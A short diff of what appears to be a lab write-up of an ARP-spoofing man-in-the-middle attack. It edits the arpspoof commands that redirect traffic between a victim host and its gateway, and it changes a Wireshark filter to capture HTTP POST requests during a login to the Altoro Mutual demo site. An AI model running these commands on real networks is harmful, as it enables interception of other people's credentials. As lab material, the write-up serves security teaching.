@@ -44,8 +44,7 @@ Edit
 
 ##step 3
 
-sudo arpspoof -i eth0 -t  192.168.0.120  192.168.0.1
-sudo arpspoof -i eth0 -t  192.168.0.1  192.168.0.120
+sudo arpspoof -t  192.168.0.120  192.168.0.1  &&  arpspoof -t  192.168.0.1  192.168.0.120
 
 This redirected traffic between victim and gateway through the attacker.
 
@@ -58,7 +57,7 @@ Started Wireshark and filtered HTTP traffic using:
 nginx
 Copy
 Edit
-http
+http.request.method==POST
 Waited for the victim to log in to the Altoro Mutual site.
 
 ##step 5
